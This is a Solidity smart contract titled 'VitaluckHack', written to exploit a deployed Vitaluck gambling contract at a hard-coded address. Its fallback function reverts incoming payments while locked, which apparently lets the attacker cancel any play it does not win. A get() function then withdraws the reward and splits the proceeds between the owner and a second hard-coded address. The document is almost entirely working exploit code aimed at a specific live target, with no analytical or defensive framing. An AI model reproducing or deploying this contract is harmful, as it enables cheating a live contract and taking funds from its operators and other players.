1 contract VitaluckHack{
2     
3     bool locked = true;
4     address owner = msg.sender;
5     
6     function()
7         public payable 
8     { 
9         if (locked){
10             revert();
11         }
12     }
13     
14     function setlock(bool what){
15         require(msg.sender == owner);
16         locked = what;
17     }
18     
19     function go() public payable {
20         Vitaluck Target = Vitaluck(0xB36A7CD3f5d3e09045D765b661aF575e3b5AF24A);
21         
22         Target.Press.value(msg.value)(1, 0);
23     }
24     
25     function get(){
26         setlock(false);
27         Vitaluck Target = Vitaluck(0xB36A7CD3f5d3e09045D765b661aF575e3b5AF24A);
28         Target.withdrawReward();
29         
30         address(0x98081ce968E5643c15de9C024dE96b18BE8e5aCe).transfer(address(this).balance/2);
31         address(owner).transfer(address(this).balance);
32     }
33     
34     
35     
36 }
37 
38 interface Vitaluck{
39     function withdrawReward() public;
40     function Press(uint a, uint b) public payable;
41 }